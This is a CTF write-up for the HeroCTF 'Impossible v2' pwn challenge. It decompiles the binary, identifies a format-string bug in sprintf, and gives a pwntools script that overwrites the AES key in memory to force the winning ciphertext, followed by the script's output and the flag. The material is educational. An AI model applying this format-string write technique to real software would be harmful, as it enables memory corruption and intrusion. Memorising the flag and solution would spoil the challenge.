# Impossible v2

### Category

Pwn

### Description

Your colleague trolls you again by giving you an impossible challenge, betting $200 that, this time, you won't succeed.
Show him that this impossible challenge is in fact easy!

Format : Hero{flag}<br>
Author : SoEasY

### Files

- [impossible_v2](impossible_v2)

### Write Up

First of all, let's check the binary:
```bash
$ file impossible_v2       
impossible_v2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=e36b1c8c585d4fa7364767816e446322d00cd8d1, for GNU/Linux 3.2.0, not stripped

$ checksec impossible_v2     
[*] '/home/soeasy/GitHub/HeroCTF_v5/Pwn/Impossible_v2/impossible_v2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
```

We have a x64 ELF with `no PIE` and `partial RELRO`. Let's execute it.
```bash
$ ./impossible_v2   
I've implemented a 1-block AES ECB 128 cipher that uses a random key.
Try to give me a message such as AES_Encrypt(message, key) = 0xdeadbeefdeadbeefcafebabecafebabe.
(don't try too much, this is impossible).

Enter your message: AAAA
Do you want to change it ? (y/n) y
Enter your message (last chance): BBBB
So, this is your final message: 424242420a0000000000000000000000000000000000000000000000000000000000000000000000

Well, I guess you're not this smart :)
```

So we have a message explaning that we have to met the condition `AES_Encrypt(message, key) = 0xdeadbeefdeadbeefcafebabecafebabe`, with an AES ECB 128 bits with a random key. By the way, keep in mind that we have two tries for our message (we can change it).

Let's check the code in IDA.
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char choice; // [rsp+3h] [rbp-3Dh]
  char c; // [rsp+3h] [rbp-3Dh]
  int i; // [rsp+4h] [rbp-3Ch]
  FILE *fd_random; // [rsp+8h] [rbp-38h]
  FILE *fd; // [rsp+8h] [rbp-38h]
  char buffer_message[40]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 stack_canary; // [rsp+38h] [rbp-8h]

  stack_canary = __readfsqword(0x28u);
  puts(
    "I've implemented a 1-block AES ECB 128 cipher that uses a random key.\n"
    "Try to give me a message such as AES_Encrypt(message, key) = 0xdeadbeefdeadbeefcafebabecafebabe.\n"
    "(don't try too much, this is impossible).\n");
  fflush(stdout);

  fd_random = fopen("/dev/urandom", "rb");
  fread(&key, 0x10uLL, 1uLL, fd_random);
  fclose(fd_random);

  printf("Enter your message: ");
  fflush(stdout);
  fgets(buffer_message, 40, stdin);

  sprintf(message, buffer_message);
  printf("Do you want to change it ? (y/n) ");
  fflush(stdout);

  choice = getc(stdin);
  getc(stdin);

  if ( choice == 'y' )
  {
    printf("Enter your message (last chance): ");
    fflush(stdout);
    fgets(buffer_message, 40, stdin);
    sprintf(message, buffer_message);
  }

  printf("So, this is your final message: ");
  for ( i = 0; i <= 39; ++i )
    printf("%02x", (unsigned __int8)message[i]);
  puts("\n");
  fflush(stdout);

  AES_Encrypt(message, &key);

  if ( !memcmp(message, expected, 0x10uLL) )
  {
    puts("WHAT ?! THIS IS IMPOSSIBLE !!!");
    fd = fopen("flag.txt", "r");
    while ( 1 )
    {
      c = getc(fd);
      if ( c == -1 )
        break;
      putchar(c);
    }
    fflush(stdout);
    fclose(fd);
  }
  else
  {
    puts("Well, I guess you're not this smart :)");
    fflush(stdout);
  }
  return 0;
}
```

We can spot a vunlerability here: `sprintf(message, buffer_message);`. The user controls the formatter in `sprintf()`, causing a format string vulnerability! THie vulnerability is present in the two inputs so we can trigger the format string and then gie a well-formed input.

There are multiple ways to solve tihs challenge: the intended way was to patch the AES key by setting it to NULL (or any value, just to be sure we control the entire key) and then enter as a message `AES_DEC(0xdeadbeefdeadbeefcafebabecafebabe, key=0)`:
```py
from pwn import *

elf = context.binary = ELF("./impossible_v2")

r = remote("static-03.heroctf.fr", 5001)
# r = elf.process()

key_addr = elf.sym['key']
log.success(f"Key address: {hex(key_addr)}")

# If we control the key, we can send decrypt(deadbeefdeadbeefcafebabecafebabe) as a message

# In [1]: cipher = AES.new(bytes.fromhex('00000000000000000000000000000000'), AES.MODE_ECB)
# In [2]: cipher.decrypt(bytes.fromhex('deadbeefdeadbeefcafebabecafebabe')).hex()
# Out[2]: '4daa646aa2b5e32d1076a9e6bfa5e2ba'

writes = {
    key_addr:       0x0,
    key_addr + 8:   0x0
}

# offset 9: AAAAAAAA-%9$p --> AAAAAAAA-0x4141414141414141
# For some reason, fmtstr_payload will produce a payload like "%11$lln%12$lln" with offset=9
# --> let's use offset=7
payload = fmtstr_payload(7, writes)

log.success(f"Payload length: {len(payload)}")
log.success(f"Payload: {payload}")

r.sendlineafter(b"Enter your message: ", payload)

r.sendlineafter(b"Do you want to change it ? (y/n) ", b"y")

message = bytes.fromhex("4daa646aa2b5e32d1076a9e6bfa5e2ba")
r.sendlineafter(b"Enter your message (last chance): ", message)

print(r.recvall().decode())
```

Execution:
```bash
$ python3 solve.py
[*] '/home/soeasy/GitHub/HeroCTF_v5/Pwn/Impossible_v2/impossible_v2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to static-03.heroctf.fr on port 5001: Done
[+] Key address: 0x4040c0
[+] Payload length: 32
[+] Payload: b'%9$lln%10$llnaaa\xc0@@\x00\x00\x00\x00\x00\xc8@@\x00\x00\x00\x00\x00'
[+] Receiving all data: Done (197B)
[*] Closed connection to static-03.heroctf.fr port 5001
So, this is your final message: 4daa646aa2b5e32d1076a9e6bfa5e2ba0a0000000000000000000000000000000000000000000000

WHAT ?! THIS IS IMPOSSIBLE !!!
Hero{AES_ECB_1S_S0_345Y_WH3N_Y0U_C0NTR0L_TH3_K3Y!!!}
```

There were others way to solve it by for example patching the GOT (which was writable).

### Flag

```
Hero{AES_ECB_1S_S0_345Y_WH3N_Y0U_C0NTR0L_TH3_K3Y!!!}
```
